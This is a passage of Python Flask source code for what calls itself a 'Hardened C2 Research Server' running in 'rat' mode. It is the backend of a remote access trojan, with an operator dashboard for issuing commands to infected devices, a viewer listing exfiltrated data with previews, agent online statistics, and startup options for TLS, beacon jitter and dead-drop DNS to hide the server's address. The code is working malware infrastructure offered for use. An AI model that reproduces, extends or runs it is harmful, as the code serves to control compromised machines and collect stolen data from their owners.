    </div>

    <h3 style="color:#c9d1d9;margin:20px 0 10px 0">Device Info</h3>
    <pre>{json.dumps(info, indent=2)}</pre>

    <h3 style="color:#c9d1d9;margin:20px 0 10px 0">Issue Command</h3>
    <form method="POST" action="/dashboard/agent/{device_id}/command">
        <div class="form-row">
            <select name="command">{cmd_options}</select>
            <input type="text" name="params" value="{{}}" placeholder='{{"key":"val"}}' style="width:300px">
            <button type="submit" class="cmd-btn">Send</button>
        </div>
    </form>

    <h3 style="color:#c9d1d9;margin:20px 0 10px 0">Command History (last 20)</h3>
    <table>
        <tr><th>ID</th><th>Command</th><th>Params</th><th>Status</th><th>Time</th></tr>
        {pending_rows if pending_rows else '<tr><td colspan="5" style="color:#6e7681">No commands</td></tr>'}
    </table>

    <h3 style="color:#c9d1d9;margin:20px 0 10px 0">Exfiltrated Data (last 20)</h3>
    <table>
        <tr><th>ID</th><th>Type</th><th>Size</th><th>Preview</th><th>Time</th></tr>
        {exfil_rows if exfil_rows else '<tr><td colspan="5" style="color:#6e7681">No data</td></tr>'}
    </table>
    """
    return content


def _build_exfil_viewer():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row

    exfil = conn.execute(
        "SELECT * FROM exfil_data ORDER BY id DESC LIMIT 100"
    ).fetchall()

    total_size = conn.execute("SELECT COALESCE(SUM(size), 0) FROM exfil_data").fetchone()[0]
    total_records = conn.execute("SELECT COUNT(*) FROM exfil_data").fetchone()[0]
    type_counts = conn.execute(
        "SELECT data_type, COUNT(*) as cnt, SUM(size) as sz FROM exfil_data GROUP BY data_type ORDER BY cnt DESC"
    ).fetchall()

    conn.close()

    type_rows = ""
    for t in type_counts:
        type_rows += f"<tr><td>{t['data_type']}</td><td>{t['cnt']}</td><td>{t['sz']:,}</td></tr>"

    rows = ""
    for e in exfil:
        preview = (e["data"] or "")[:300]
        preview = preview.replace("<", "&lt;").replace(">", "&gt;")
        rows += f"""
        <tr>
            <td>{e['id']}</td>
            <td><a href="/dashboard/agent/{e['device_id']}">{e['device_id'][:16]}</a></td>
            <td>{e['data_type']}</td>
            <td>{e['size']:,}</td>
            <td><pre style="max-height:80px;max-width:600px;font-size:11px">{preview}</pre></td>
            <td>{e['received_at'][:19] if e['received_at'] else '?'}</td>
        </tr>"""

    content = f"""
    <h2>Exfiltrated Data</h2>
    <div class="stats">
        <div class="stat-card"><div class="label">Total Records</div><div class="value">{total_records}</div></div>
        <div class="stat-card"><div class="label">Total Size</div><div class="value">{total_size:,} B</div></div>
    </div>

    <h3>Data Types</h3>
    <table style="max-width:500px">
        <tr><th>Type</th><th>Count</th><th>Total Size</th></tr>
        {type_rows if type_rows else '<tr><td colspan="3" style="color:#6e7681">No data</td></tr>'}
    </table>

    <h3>All Records (last 100)</h3>
    <table>
        <tr><th>ID</th><th>Agent</th><th>Type</th><th>Size</th><th>Data</th><th>Time</th></tr>
        {rows if rows else '<tr><td colspan="6" style="color:#6e7681">No exfiltrated data yet</td></tr>'}
    </table>
    """
    return content


@app.route("/dashboard")
def dashboard():
    return render_template_string(DASHBOARD_HTML, content=_build_overview())


@app.route("/dashboard/agents")
def dashboard_agents():
    return render_template_string(DASHBOARD_HTML, content=_build_agents_list())


@app.route("/dashboard/agent/<device_id>")
def dashboard_agent_detail(device_id):
    return render_template_string(DASHBOARD_HTML, content=_build_agent_detail(device_id))


@app.route("/dashboard/exfil")
def dashboard_exfil():
    return render_template_string(DASHBOARD_HTML, content=_build_exfil_viewer())


@app.route("/stats")
def stats():
    conn = sqlite3.connect(DB_PATH)
    now = datetime.utcnow().isoformat()
    two_min_ago = (datetime.utcnow() - timedelta(minutes=2)).isoformat()

    conn.execute("UPDATE agents SET online=0 WHERE last_seen < ?", (two_min_ago,))
    conn.commit()

    stats_data = {
        "total_requests": conn.execute("SELECT COUNT(*) FROM requests").fetchone()[0],
        "unique_clients": conn.execute("SELECT COUNT(*) FROM clients").fetchone()[0],
        "total_agents": conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0],
        "online_agents": conn.execute(
            "SELECT COUNT(*) FROM agents WHERE online=1 AND last_seen > ?",
            (two_min_ago,)
        ).fetchone()[0],
        "commands_pending": conn.execute(
            "SELECT COUNT(*) FROM command_queue WHERE status='pending'"
        ).fetchone()[0],
        "commands_sent": conn.execute(
            "SELECT COUNT(*) FROM command_queue WHERE status IN ('sent','acked')"
        ).fetchone()[0],
        "exfil_records": conn.execute("SELECT COUNT(*) FROM exfil_data").fetchone()[0],
        "exfil_total_bytes": conn.execute(
            "SELECT COALESCE(SUM(size), 0) FROM exfil_data"
        ).fetchone()[0],
        "recent_clients": [
            {"device_id": r[0], "last_seen": r[1], "count": r[2]}
            for r in conn.execute(
                "SELECT device_id, last_seen, request_count FROM clients ORDER BY last_seen DESC LIMIT 10"
            ).fetchall()
        ],
    }
    conn.close()
    return jsonify(stats_data)


@app.route("/")
def index():
    return jsonify({
        "service": "C2 Research Server",
        "version": "2.0",
        "mode": "rat",
        "endpoints": {
            "agent_api": ["/c2/register", "/c2/commands/<device_id>",
                          "/c2/exfil/<device_id>", "/c2/command_ack"],
            "legacy": ["/c2/command", "/c2/heartbeat", "/c2/exfil", "/c2/log"],
            "dashboard": ["/dashboard", "/dashboard/agents", "/dashboard/exfil"],
        },
    })


def main():
    parser = argparse.ArgumentParser(description="Hardened C2 Research Server")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--db", default="./c2_data.db")
    parser.add_argument("--tls-cert", help="Path to TLS certificate PEM")
    parser.add_argument("--tls-key", help="Path to TLS private key PEM")
    parser.add_argument("--api-key", help="Operator API key (or set C2_API_KEY env)")
    parser.add_argument("--jitter", type=int, default=5000, help="Beacon jitter in ms")
    parser.add_argument("--dead-drop-domain", help="Dead drop domain for C2 address")
    parser.add_argument("--custom-commands", help="JSON file with custom command list")
    args = parser.parse_args()

    global DB_PATH, OPERATOR_API_KEY, BEACON_JITTER_MS
    DB_PATH = args.db
    BEACON_JITTER_MS = args.jitter
    if args.api_key:
        OPERATOR_API_KEY = args.api_key

    if args.custom_commands and os.path.exists(args.custom_commands):
        with open(args.custom_commands) as f:
            custom = json.load(f)
            DEFAULT_COMMANDS.clear()
            DEFAULT_COMMANDS.extend(custom)
            print(f"[*] Loaded {len(custom)} custom commands")

    if args.dead_drop_domain:
        drops = dead_drop.generate_dns_queries(args.dead_drop_domain, f"{args.host}:{args.port}")
        print(f"[*] Dead drop DNS queries for {args.dead_drop_domain}:")
        for d in drops:
            print(f"    {d['qname']}")

    init_db()
    app.config["START_TIME"] = time.time()

    print(f"[*] Hardened C2 Server starting on {args.host}:{args.port}")
    print(f"[*] Database: {args.db}")
    print(f"[*] API Key: {OPERATOR_API_KEY[:8]}...")
    print(f"[*] Beacon jitter: {BEACON_JITTER_MS}ms")
    print(f"[*] Rate limit: {RATE_LIMIT_MAX} req/{RATE_LIMIT_WINDOW}s")
    print(f"[*] Dashboard: http://localhost:{args.port}/dashboard")
    print(f"[*] Agent API: /c2/register, /c2/commands/<id>, /c2/exfil/<id>")
    print(f"[*] Commands: {len(DEFAULT_COMMANDS)}")

    if args.tls_cert and args.tls_key:
        print(f"[*] TLS enabled: cert={args.tls_cert}")
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(args.tls_cert, args.tls_key)
        app.run(host=args.host, port=args.port, debug=False, ssl_context=context)
    else:
        print("[!] WARNING: Running without TLS. Use --tls-cert/--tls-key for production.")
        app.run(host=args.host, port=args.port, debug=False)


if __name__ == "__main__":
    main()
